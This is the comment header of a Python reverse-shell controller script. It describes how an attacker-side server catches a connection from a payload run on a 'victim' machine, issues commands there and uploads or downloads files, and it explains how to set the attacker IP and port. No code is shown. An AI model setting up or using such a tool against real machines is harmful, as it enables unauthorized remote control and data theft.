# REVERSE_SHELL SERVER
#======================
# REQUIREMENTS:-
# 1) CORRESPONDING REVERSE_SHELL.PY SCRIPT

# THIS SCRIPT, ALONG WITH ITS REVERSE_SHELL
# ALLOWS A BASIC REMOTE CONNECTION TO A TARGET MACHINE
# server.py IS THE CONTROLLER (TO BE DEPLOYED ON THE ATTACKER)
# reverse_shell.py IS THE PAYLOAD (TO BE INJECTED INTO THE VICTIM AND NEEDS TO BE RUN BY THE USER)
# THE SERVER MUST BE UP AND LISTENING FOR INCOMING CONNECTIONS
# BEFORE THE PAYLOAD IS TRIGGERED, OTHERWISE SERVER WILL NOT CATCH THE CONNECTION

# ONCE CONNECTED, THE SERVER REPLICATES A CLI OF THE VICTIM MACHINE
# COMMANDS CAN BE ISSUED FROM THE SERVER TO BE EXECUTED ON THE VICTIM
# THE SERVER CAN ALSO UPLOAD (INJECT FILES FROM ATTACKER MACHINE TO VICTIM)
# OR DOWNLOAD (PULL FILES FROM VICTIM TO ATTACKER) FILES TO AND FROM THE VICTIM
# USING THE download OR upload COMMANDS
# 
# THE CONNECTION CAN BE CLOSED BY ISSUING THE quit OR exit COMMANDS

# NOTE:-
# THIS IS A NON-PERSISTENT SCRIPT
# ONCE DISCONNECTED, THE WHOLE CONNECTION PROCESS NEEDS TO BE RE-DONE
# BOTH ON THE ATTACKER AND THE VICTIM ENDS

# PS:-
#=====
# THE SERVER AS WELL AS THE REVERSE_SHELL SCRIPTS REQUIRE THE 
# IP ADDRESS AND PORT NUMBER OF THE LISTENING MACHINE
# THESE FIELDS MUST BE CHANGED ACCORDINGLY IN BOTH THE SCRIPTS
# BEFORE USE FOR CORRECT FUNCTIONING OF THE SCRIPTS
#
# HOW TO :-
#-----------
# IN server.py :
# ------------
# GO TO THE BOTTOM OF THE SCRIPT, IN THE init_server() FUNCTION
# LOOK FOR THE FOLLOWING FIELDS UNDER "# details of the listening machine" - 
# attack_ip = "192.168.0.107"
# listen_port = 54321
# CHANGE THE VALUES WITHIN THE ANGLE BRACKETS 
#
# IN reverse_shell.py :
# -------------------
# GO TO THE BOTTOM OF THE CODE
# LOOK FOR THE FOLLOWING FIELDS UNDER "# details of the listening machine (connect to)" - 
# connect_ip = "<SOME_IP_ADDRESS>"
# conn_port = <SOME_PORT_NUMBER>
# CHANGE THE VALUES WITHIN THE ANGLE BRACKETS
